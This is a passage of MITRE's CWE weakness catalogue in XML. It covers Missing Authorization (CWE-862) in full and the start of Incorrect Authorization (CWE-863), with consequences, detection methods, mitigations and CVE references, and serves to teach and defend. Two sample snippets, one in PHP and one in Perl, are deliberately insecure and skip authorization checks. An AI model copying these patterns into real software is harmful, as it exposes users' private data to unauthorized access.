               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
				</Modification>
		<Contribution Type="Feedback">
		  <Contribution_Name>Anonymous External Contributor</Contribution_Name>
		  <Contribution_Date>2021-11-11</Contribution_Date>
		  <Contribution_Comment>Reported an error in a demonstrative example</Contribution_Comment>
		</Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="862" Name="Missing Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product does not perform an authorization check when an actor attempts to access a resource or perform an action.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is distinct from "AuthN" (or, sometimes, "AuthC") which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>
                  <xhtml:p>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</xhtml:p>
                  <xhtml:p>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-95">
               <Intro_Text>This function runs an arbitrary SQL query on a given database, returning the result of the query.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function runEmployeeQuery($dbName, $name){<xhtml:div style="margin-left:1em;">mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);<xhtml:br/>
                        <xhtml:i>//Use a prepared statement to avoid CWE-89</xhtml:i>
                        <xhtml:br/>$preparedStatement = $globalDbHandle-&gt;prepare('SELECT * FROM employees WHERE name = :name');<xhtml:br/>$preparedStatement-&gt;execute(array(':name' =&gt; $name));<xhtml:br/>return $preparedStatement-&gt;fetchAll();</xhtml:div>}<xhtml:br/>
                     <xhtml:i>/.../</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</xhtml:div>
               </Example_Code>
               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-96">
               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>sub DisplayPrivateMessage {<xhtml:div style="margin-left:1em;">my($id) = @_;<xhtml:br/>my $Message = LookupMessageObject($id);<xhtml:br/>print "From: " . encodeHTML($Message-&gt;{from}) . "&lt;br&gt;\n";<xhtml:br/>print "Subject: " . encodeHTML($Message-&gt;{subject}) . "\n";<xhtml:br/>print "&lt;hr&gt;\n";<xhtml:br/>print "Body: " . encodeHTML($Message-&gt;{body}) . "\n";</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $q = new CGI;<xhtml:br/>
                     <xhtml:i># For purposes of this example, assume that CWE-309 and</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># CWE-523 do not apply.</xhtml:i>
                     <xhtml:br/>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:1em;">ExitError("invalid username or password");</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $id = $q-&gt;param('id');<xhtml:br/>DisplayPrivateMessage($id);</xhtml:div>
               </Example_Code>
               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-24730</Reference>
               <Description>Go-based continuous deployment product does not check that a user has certain privileges to update or create an app, allowing adversaries to read sensitive repository information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3168</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3597</Reference>
               <Description>Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2282</Reference>
               <Description>Terminal server does not check authorization for guest access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5027</Reference>
               <Description>System monitoring software allows users to bypass authorization by creating custom forms.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5027</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3781</Reference>
               <Description>Content management system does not check access permissions for private files, allowing others to view those files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3781</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6548</Reference>
               <Description>Product does not check the ACL of a page accessed using an "include" directive, allowing attackers to read unauthorized files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6548</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2960</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3230</Reference>
               <Description>Database server does not use appropriate privileges for certain sensitive operations.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3230</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3424</Link>
            </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2005-1036</Reference>
	     <Description>Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2005-1036</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2925</Reference>
               <Description>Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2925</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3623</Reference>
               <Description>OS kernel does not check for a certain privilege before setting ACLs for files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1155</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-17533</Reference>
               <Description>Chain: unchecked return value (CWE-252) of some functions for policy enforcement leads to authorization bypass (CWE-862)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-17533</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="665"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2011-05-24</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="863" Name="Incorrect Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is distinct from "AuthN" (or, sometimes, "AuthC") which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. Even if they can be customized to recognize these schemes, they might not be able to tell whether the scheme correctly performs the authorization in a way that cannot be bypassed or subverted by an attacker.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may not be able to find interfaces that are protected by authorization checks, even if those checks contain weaknesses.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
